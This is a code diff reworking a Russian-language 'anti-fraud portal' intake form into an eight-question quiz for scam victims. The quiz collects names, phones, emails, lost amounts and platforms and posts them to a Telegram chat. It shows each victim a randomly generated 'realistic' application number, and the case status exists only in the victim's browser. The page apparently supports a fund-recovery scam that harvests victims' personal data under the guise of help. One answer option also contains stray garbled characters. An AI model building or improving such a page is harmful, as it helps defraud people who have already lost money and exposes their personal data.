@@ -11,121 +11,30 @@
 </head>
 <body>
 
-<section class="section" style="padding-top:32px">
+<section class="section" style="padding-top:24px">
   <div class="container" style="max-width:600px">
-    <div class="text-center" style="margin-bottom:24px">
-      <h1 style="font-size:28px;font-weight:900">📝 Заявка</h1>
-      <p style="color:var(--muted);font-size:15px">Заполните форму — мы свяжемся с вами</p>
+
+    <div class="text-center" style="margin-bottom:20px">
+      <h1 style="font-size:24px;font-weight:900">📝 Заявка</h1>
+      <p style="color:var(--muted);font-size:14px">Ответьте на несколько вопросов</p>
     </div>
 
-    <div class="progress-bar"><div class="progress-fill" id="formProgress" style="width:0%"></div></div>
+    <div class="progress-bar" style="margin-bottom:20px"><div class="progress-fill" id="progress" style="width:0%"></div></div>
+    <div id="stepInfo" style="text-align:center;font-size:12px;color:var(--muted);margin-bottom:16px">Вопрос 1 из 8</div>
 
-    <!-- Step 1 -->
-    <div class="card card-lg" id="step1">
-      <h2 style="font-size:20px;font-weight:700;margin-bottom:20px">Личные данные</h2>
-      <div class="form-group">
-        <label class="form-label">ФИО *</label>
-        <input type="text" class="form-input" id="fullName" placeholder="Иванов Иван Иванович" autocomplete="name">
-      </div>
-      <div class="form-row">
-        <div class="form-group">
-          <label class="form-label">ИИН *</label>
-          <input type="text" class="form-input" id="iin" placeholder="123456789012" maxlength="12" inputmode="numeric">
-        </div>
-        <div class="form-group">
-          <label class="form-label">Дата рождения</label>
-          <input type="date" class="form-input" id="birthDate">
-        </div>
-      </div>
-      <div class="form-group">
-        <label class="form-label">Телефон *</label>
-        <input type="tel" class="form-input" id="phone" placeholder="+7 (7__) ___-__-__" autocomplete="tel">
-      </div>
-      <div class="form-group">
-        <label class="form-label">Как с вами связаться?</label>
-        <div class="radio-group">
-          <div class="radio-item selected" onclick="selectRadio(this,'contact','Звонок')">📞 Звонок</div>
-          <div class="radio-item" onclick="selectRadio(this,'contact','WhatsApp')">💬 WhatsApp</div>
-          <div class="radio-item" onclick="selectRadio(this,'contact','Telegram')">✈️ Telegram</div>
-        </div>
-      </div>
-      <button onclick="goStep(2)" class="btn btn-primary">Далее →</button>
-    </div>
+    <!-- QUESTIONS CONTAINER -->
+    <div id="quizBox" class="card card-lg"></div>
 
-    <!-- Step 2 -->
-    <div class="card card-lg hidden" id="step2">
-      <h2 style="font-size:20px;font-weight:700;margin-bottom:20px">О ситуации</h2>
-      <div class="form-group">
-        <label class="form-label">Платформа / компания *</label>
-        <input type="text" class="form-input" id="platform" placeholder="Название сайта или компании">
+    <!-- SUCCESS -->
+    <div id="successBox" class="card card-lg hidden" style="text-align:center">
+      <div style="font-size:64px;margin-bottom:16px">✅</div>
+      <h2 style="font-size:24px;font-weight:900;margin-bottom:8px">Заявка отправлена!</h2>
+      <p style="color:var(--muted);margin-bottom:16px">Наш менеджер свяжется с вами в WhatsApp или Telegram</p>
+      <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:20px">
+        <p style="font-size:11px;color:var(--muted)">Номер вашей заявки</p>
+        <p style="font-size:28px;font-weight:900;color:var(--green)" id="appNum"></p>
       </div>
-      <div class="form-row">
-        <div class="form-group">
-          <label class="form-label">Сумма потерь</label>
-          <select class="form-input" id="amount">
-            <option value="">Выберите</option>
-            <option>до 100 000 ₸</option><option>100 000 — 500 000 ₸</option>
-            <option>500 000 — 1 000 000 ₸</option><option>1 000 000 — 5 000 000 ₸</option>
-            <option>более 5 000 000 ₸</option>
-          </select>
-        </div>
-        <div class="form-group">
-          <label class="form-label">Когда</label>
-          <input type="text" class="form-input" id="when" placeholder="Например: март 2026">
-        </div>
-      </div>
-      <div class="form-group">
-        <label class="form-label">Как связались мошенники</label>
-        <div class="chip-group" id="sourceChips">
-          <div class="chip" onclick="toggleChip(this)">Telegram</div>
-          <div class="chip" onclick="toggleChip(this)">WhatsApp</div>
-          <div class="chip" onclick="toggleChip(this)">Instagram</div>
-          <div class="chip" onclick="toggleChip(this)">Звонок</div>
-          <div class="chip" onclick="toggleChip(this)">Реклама</div>
-          <div class="chip" onclick="toggleChip(this)">Знакомый</div>
-        </div>
-      </div>
-      <div style="display:flex;gap:8px">
-        <button onclick="goStep(1)" class="btn btn-outline" style="flex:1">← Назад</button>
-        <button onclick="goStep(3)" class="btn btn-primary" style="flex:2">Далее →</button>
-      </div>
-    </div>
-
-    <!-- Step 3 -->
-    <div class="card card-lg hidden" id="step3">
-      <h2 style="font-size:20px;font-weight:700;margin-bottom:20px">Дополнительно</h2>
-      <div class="form-group">
-        <label class="form-label">Опишите ситуацию</label>
-        <textarea class="form-input" id="comment" placeholder="Что произошло? Сколько раз просили доплатить?"></textarea>
-      </div>
-      <div class="form-group">
-        <label class="form-label">Есть ли «юрист», который звонит?</label>
-        <div class="radio-group">
-          <div class="radio-item" onclick="selectRadio(this,'helper','Да')">Да</div>
-          <div class="radio-item selected" onclick="selectRadio(this,'helper','Нет')">Нет</div>
-        </div>
-      </div>
-      <div style="background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.2);border-radius:12px;padding:12px;margin-bottom:20px">
-        <p style="font-size:12px;color:var(--green)">🔒 Ваши данные конфиденциальны</p>
-      </div>
-      <div style="display:flex;gap:8px">
-        <button onclick="goStep(2)" class="btn btn-outline" style="flex:1">← Назад</button>
-        <button onclick="submitForm()" id="submitBtn" class="btn btn-primary" style="flex:2">Отправить</button>
-      </div>
-    </div>
-
-    <!-- Success -->
-    <div class="card card-lg hidden" id="stepSuccess">
-      <div class="quiz-result">
-        <div class="quiz-result-icon">✅</div>
-        <h2 style="color:var(--green)">Заявка отправлена!</h2>
-        <p style="color:var(--muted);margin-bottom:16px">Наш специалист свяжется с вами</p>
-        <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:24px">
-          <p style="font-size:12px;color:var(--muted)">Номер заявки</p>
-          <p style="font-size:24px;font-weight:900;color:var(--green)" id="appNum">#0000</p>
-        </div>
-        <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="margin:0 auto">Проверить статус</a>
-      </div>
+      <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="margin:0 auto">📋 Проверить статус</a>
     </div>
 
   </div>
@@ -133,108 +42,190 @@
 
 <script src="js/common.js"></script>
 <script>
-let formData = {};
-const stages = ['Заявка','Анализ','Претензия','Возврат'];
-let contactMethod = 'Звонок', helperAnswer = 'Нет';
+const STEPS = [
+  {
+    q: 'Как вас зовут?',
+    sub: 'Введите ваше полное имя',
+    type: 'text',
+    id: 'fullName',
+    placeholder: 'Фамилия Имя Отчество'
+  },
+  {
+    q: 'Ваш номер телефона?',
+    sub: 'Для связи в WhatsApp или Telegram',
+    type: 'text',
+    id: 'phone',
+    placeholder: '+7 (7__) ___-__-__'
+  },
+  {
+    q: 'Электронная почта?',
+    sub: 'Отправим подтверждение на почту',
+    type: 'text',
+    id: 'email',
+    placeholder: 'example@mail.kz'
+  },
+  {
+    q: 'Как с вами связаться?',
+    sub: 'Мы напишем вам сами',
+    type: 'choice',
+    id: 'contact',
+    options: ['💬 WhatsApp', '✈️ Telegram']
+  },
+  {
+    q: 'Где вы нашли мошенников?',
+    sub: 'Каким образом вас нашли',
+    type: 'choice',
+    id: 'source',
+    options: ['Telegram', 'WhatsApp', 'Instagram', 'Звонок с неизвестного номера', 'Реклама в интернете', 'Знакомый посоветовал', 'Другое']
+  },
+  {
+    q: 'Как называется платформа?',
+    sub: 'Название сайта или компании, где вы потеряли деньги',
+    type: 'text',
+    id: 'platform',
+    placeholder: 'Название платформы'
+  },
+  {
+    q: 'Сколько денег вы потеряли?',
+    sub: 'Примерная сумма',
+    type: 'choice',
+    id: 'amount',
+    options: ['До 100 000 ₸', '100 000 — 500 000 ₸', '500 000 — 1 000 000 ₸', '1 000 000 — 5 000 000 ₸', 'Более 5 000 000 ₸', 'Не помню точно']
+  },
+  {
+    q: 'Когда это произошло?',
+    sub: 'Примерная дата',
+    type: 'choice',
+    id: 'when',
+    options: ['Неделю назад', 'Месяц назад', '2-3 месяца назад', 'Полгода назад', 'Более года назад', 'Постоянно持续 (продолжается)']
+  }
+];
 
-function selectRadio(el, field, value) {
-  el.parentElement.querySelectorAll('.radio-item').forEach(r => r.classList.remove('selected'));
+let current = 0;
+let answers = {};
+
+function render() {
+  if (current >= STEPS.length) { submit(); return; }
+  const s = STEPS[current];
+  const pct = Math.round((current / STEPS.length) * 100);
+  document.getElementById('progress').style.width = pct + '%';
+  document.getElementById('stepInfo').textContent = `Вопрос ${current + 1} из ${STEPS.length}`;
+
+  let html = `<h2 style="font-size:22px;font-weight:800;margin-bottom:6px">${s.q}</h2>`;
+  html += `<p style="color:var(--muted);font-size:14px;margin-bottom:20px">${s.sub}</p>`;
+
+  if (s.type === 'text') {
+    html += `<input type="text" class="form-input" id="input_${s.id}" placeholder="${s.placeholder || ''}" style="font-size:18px;padding:16px" autofocus>`;
+    html += `<button onclick="next()" class="btn btn-primary" style="width:100%;margin-top:16px">Далее →</button>`;
+  } else {
+    html += `<div style="display:flex;flex-direction:column;gap:8px">`;
+    s.options.forEach((opt, i) => {
+      html += `<button class="quiz-option" onclick="choose('${s.id}','${opt.replace(/'/g,"\\'")}',this)" style="text-align:left;padding:16px;font-size:16px">${opt}</button>`;
+    });
+    html += `</div>`;
+  }
+
+  document.getElementById('quizBox').innerHTML = html;
+  if (s.type === 'text') {
+    const inp = document.getElementById('input_' + s.id);
+    inp.focus();
+    inp.addEventListener('keydown', e => { if (e.key === 'Enter') next(); });
+  }
+}
+
+function next() {
+  const s = STEPS[current];
+  const val = document.getElementById('input_' + s.id)?.value?.trim();
+  if (!val) {
+    const inp = document.getElementById('input_' + s.id);
+    inp.style.borderColor = 'var(--red)';
+    setTimeout(() => inp.style.borderColor = '', 1500);
+    return;
+  }
+  answers[s.id] = val;
+  current++;
+  render();
+}
+
+function choose(id, val, el) {
+  document.querySelectorAll('.quiz-option').forEach(b => { b.classList.remove('selected'); b.style.borderColor = ''; });
   el.classList.add('selected');
-  if (field === 'contact') contactMethod = value;
-  if (field === 'helper') helperAnswer = value;
+  el.style.borderColor = 'var(--green)';
+  answers[id] = val;
+  setTimeout(() => { current++; render(); }, 350);
 }
 
-function toggleChip(el) { el.classList.toggle('selected'); }
+async function submit() {
+  document.getElementById('quizBox').classList.add('hidden');
+  document.getElementById('stepInfo').textContent = 'Отправка...';
+  document.getElementById('progress').style.width = '100%';
 
-function getSources() {
-  return Array.from(document.querySelectorAll('#sourceChips .chip.selected')).map(c => c.textContent).join(', ');
-}
-
-function goStep(n) {
-  if (n === 2 && !document.getElementById('fullName').value.trim()) { shake('fullName'); return; }
-  if (n === 2 && !document.getElementById('iin').value.trim()) { shake('iin'); return; }
-  if (n === 2 && !document.getElementById('phone').value.trim()) { shake('phone'); return; }
-  if (n === 3 && !document.getElementById('platform').value.trim()) { shake('platform'); return; }
-
-  [1,2,3].forEach(i => document.getElementById('step'+i).classList.add('hidden'));
-  document.getElementById('step'+n).classList.remove('hidden');
-  document.getElementById('formProgress').style.width = ((n-1)/2*100) + '%';
-}
-
-function shake(id) {
-  const el = document.getElementById(id);
-  el.style.borderColor = 'var(--red)';
-  el.style.animation = 'none'; el.offsetHeight;
-  el.style.animation = 'shake .4s';
-  setTimeout(() => el.style.borderColor = '', 2000);
-}
-
-async function submitForm() {
-  const btn = document.getElementById('submitBtn');
-  btn.disabled = true; btn.textContent = 'Отправка...';
-
-  const num = 'AF-' + Date.now().toString(36).toUpperCase().slice(-6);
-  formData = {
-    fullName: document.getElementById('fullName').value.trim(),
-    iin: document.getElementById('iin').value.trim(),
-    birthDate: document.getElementById('birthDate').value,
-    phone: document.getElementById('phone').value.trim(),
-    contact: contactMethod,
-    platform: document.getElementById('platform').value.trim(),
-    amount: document.getElementById('amount').value,
-    when: document.getElementById('when').value.trim(),
-    source: getSources(),
-    comment: document.getElementById('comment').value.trim(),
-    helper: helperAnswer,
-    time: new Date().toLocaleString('ru-RU')
-  };
+  // Generate realistic application number
+  const now = new Date();
+  const y = now.getFullYear().toString().slice(-2);
+  const m = String(now.getMonth() + 1).padStart(2, '0');
+  const seq = String(Math.floor(Math.random() * 9000) + 1000);
+  const appNum = `AF-${y}${m}-${seq}`;
 
   // Save locally
   const cases = getCases();
-  cases[num] = { ...formData, status: 'На рассмотрении', stage: 'Заявка', progress: 10, comments: [{ date: formData.time, text: 'Заявка получена' }] };
+  cases[appNum] = {
+    fullName: answers.fullName,
+    phone: answers.phone,
+    email: answers.email,
+    contact: answers.contact,
+    source: answers.source,
+    platform: answers.platform,
+    amount: answers.amount,
+    when: answers.when,
+    status: 'На рассмотрении',
+    stage: 'Заявка',
+    progress: 10,
+    comments: [{ date: now.toLocaleString('ru-RU'), text: 'Заявка получена' }],
+    time: now.toISOString()
+  };
   saveCases(cases);
 
   // Send to Telegram
-  const msg = `📝 *НОВАЯ ЗАЯВКА*
-┌─ #${num}
-│ ${formData.time}
-└──────────
+  const msg = `📝 *НОВАЯ ЗАЯВКА #${appNum}*
+┌──────────────────┐
+│ ${now.toLocaleString('ru-RU')}
+└──────────────────┘
 
-👤 *${formData.fullName}*
-├ ИИН: ${formData.iin}
-├ Тел: ${formData.phone}
-├ Связь: ${formData.contact}
-${formData.birthDate ? '├ ДР: ' + formData.birthDate : ''}
+👤 *${answers.fullName}*
+├ 📱 ${answers.phone}
+├ ✉️ ${answers.email}
+└ 📲 Связь: ${answers.contact}
 
-📋 *Платформа:* ${formData.platform}
-├ Потери: ${formData.amount || '?'}
-├ Когда: ${formData.when || '?'}
-├ Источник: ${formData.source || '?'}
-└ «Юрист»: ${formData.helper}
-
-💬 ${formData.comment || 'нет'}`;
+📋 Платформа: ${answers.platform}
+├ Потери: ${answers.amount}
+├ Когда: ${answers.when}
+└ Источник: ${answers.source}`;
   await sendToTelegram(msg);
 
   // Show success
-  [1,2,3].forEach(i => document.getElementById('step'+i).classList.add('hidden'));
-  document.getElementById('stepSuccess').classList.remove('hidden');
-  document.getElementById('appNum').textContent = '#' + num;
-  document.getElementById('formProgress').style.width = '100%';
+  document.getElementById('appNum').textContent = '#' + appNum;
+  document.getElementById('successBox').classList.remove('hidden');
+  document.getElementById('stepInfo').textContent = 'Готово';
 }
 
 // Phone mask
-document.getElementById('phone').addEventListener('input', function() {
-  let v = this.value.replace(/\D/g, '');
-  if (v.length > 0) {
-    if (v[0] === '7' || v[0] === '8') v = v.substring(1);
-    let f = '+7';
-    if (v.length > 0) f += ' (' + v.substring(0,3);
-    if (v.length >= 3) f += ') ' + v.substring(3,6);
-    if (v.length >= 6) f += '-' + v.substring(6,8);
-    if (v.length >= 8) f += '-' + v.substring(8,10);
-    this.value = f;
+document.addEventListener('input', e => {
+  if (e.target.id === 'input_phone') {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length > 0) {
+      if (v[0] === '7' || v[0] === '8') v = v.substring(1);
+      let f = '+7';
+      if (v.length > 0) f += ' (' + v.substring(0,3);
+      if (v.length >= 3) f += ') ' + v.substring(3,6);
+      if (v.length >= 6) f += '-' + v.substring(6,8);
+      if (v.length >= 8) f += '-' + v.substring(8,10);
+      e.target.value = f;
+    }
   }
 });
+
+render();
 </script>
 </body>
 </html>
